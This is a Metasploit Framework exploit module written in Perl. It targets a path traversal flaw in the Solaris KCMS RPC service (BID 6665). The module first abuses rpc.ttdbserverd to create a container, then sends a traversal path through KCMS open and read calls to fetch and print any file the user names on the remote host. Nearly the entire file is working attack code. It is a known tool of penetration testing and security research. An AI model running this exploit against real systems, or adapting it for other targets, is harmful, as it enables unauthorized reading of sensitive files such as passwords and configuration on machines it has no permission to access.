##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_kcms_readfile;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::SunRPC;
use Pex::XDR;

my $advanced = { };
my $info =
{
	'Name'  => 'Solaris KCMS Arbitary File Read',
	'Version'  => '$Revision: 1.7 $',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'  => [ ],
	'OS'    => [ ],
	'Priv'  => 0,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target RPC port', 111],
		'RFILE' => [1, 'DATA', 'The target file'],
	},
	'Description'  => Pex::Text::Freeform(qq{
		Possible to read any file on the remote file system. Relies on the
		remote host also having an active rpc.ttdbserverd server running.
	}),
	'Refs'  =>  [
		['BID', 6665],
	],
	'Targets' => [ ],
	'Keys'  => ['kcms'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;

	my $host = $self->GetVar('RHOST');
	my $port = $self->GetVar('RPORT');
	my $file = $self->GetVar('RFILE');

	if(length($file) > 1000)
	{
		$self->PrintLine("[*] File name is too long.");
		return;
	}

	if(ttdb_build($self, $host, $port, "/etc/openwin/devdata/profiles/TT_DB/oid_container") == -1)
	{
		return;
	}

	my %data;

	if(Pex::SunRPC::Clnt_create(\%data, $host, $port, 100221, 1, "tcp", "tcp") == -1)
	{
		$self->PrintLine("[*] RPC request failed (kcms).");
		return;
	}

	Pex::SunRPC::Authunix_create(\%data, "localhost", 0, 0, []);

	my $buf =
		Pex::XDR::Encode_string("TT_DB/" . "../" x 5 . $file, 1024).
		Pex::XDR::Encode_int(0).	# O_RDONLY
		Pex::XDR::Encode_int(0755);

	if(Pex::SunRPC::Clnt_call(\%data, 1003, $buf) == -1)
	{
		$self->PrintLine("[*] KCMS open() request failed.");
		return;
	}

	my $ack = Pex::XDR::Decode_int(\$data{'data'});
	my $file_size = Pex::XDR::Decode_int(\$data{'data'});
	my $fd = Pex::XDR::Decode_int(\$data{'data'});

	if($ack != 0)
	{
		$self->PrintLine("[*] KCMS open() failed (\$ack != 0)");

		if($file_size == 0)
		{
			$self->PrintLine("[*] File does not exist (or $host is patched)");
		}

		return;
	}

	$self->PrintLine("[*] fd: $fd\n[*] file size: $file_size");

	$buf =
		Pex::XDR::Encode_int($fd).
		Pex::XDR::Encode_int(0).
		Pex::XDR::Encode_int($file_size);

	if(Pex::SunRPC::Clnt_call(\%data, 1005, $buf) == -1)
	{
		$self->PrintLine("[*] KCMS read() request failed.");
		return;
	}

	Pex::XDR::Decode_int(\$data{'data'});
	my @file_chars = Pex::XDR::Decode_varray(\$data{'data'}, \&Pex::XDR::Decode_lchar);

	$self->PrintLine(join("", @file_chars));

	$buf =
		Pex::XDR::Encode_int($fd);

	if(Pex::SunRPC::Clnt_call(\%data, 1004, $buf) == -1)
	{
		$self->PrintLine("[*] KCMS close() request failed.");
	}

	Pex::SunRPC::Clnt_destroy(\%data);

	return;
}

sub ttdb_build {
	my ($self, $host, $port, $path) = @_;

	my %data;

	if(Pex::SunRPC::Clnt_create(\%data, $host, $port, 100083, 1, "tcp", "tcp") == -1)
	{
		$self->PrintLine("[*] RPC request failed (rpc.ttdbserverd).");
		return -1;
	}

	Pex::SunRPC::Authunix_create(\%data, "localhost", 0, 0, []);

	my $buf =
		Pex::XDR::Encode_string($path, 1024).
		Pex::XDR::Encode_int(length($path)).
		Pex::XDR::Encode_int(1).		# KEY (VArray head?)
		Pex::XDR::Encode_int(2).
		Pex::XDR::Encode_int(1).
		Pex::XDR::Encode_int(0).		# KEYDESC
		Pex::XDR::Encode_int(2).
		Pex::XDR::Encode_int(1).
		(Pex::XDR::Encode_int(0) x 21).		# /KEYDESC, /KEY
		Pex::XDR::Encode_int(0x10002).
		Pex::XDR::Encode_int(length($path));

	if(Pex::SunRPC::Clnt_call(\%data, 3, $buf) == -1)
	{
		$self->PrintLine("[*] rpc.ttdbserverd request failed.");
		return -1;
	}

	Pex::SunRPC::Clnt_destroy(\%data);
}

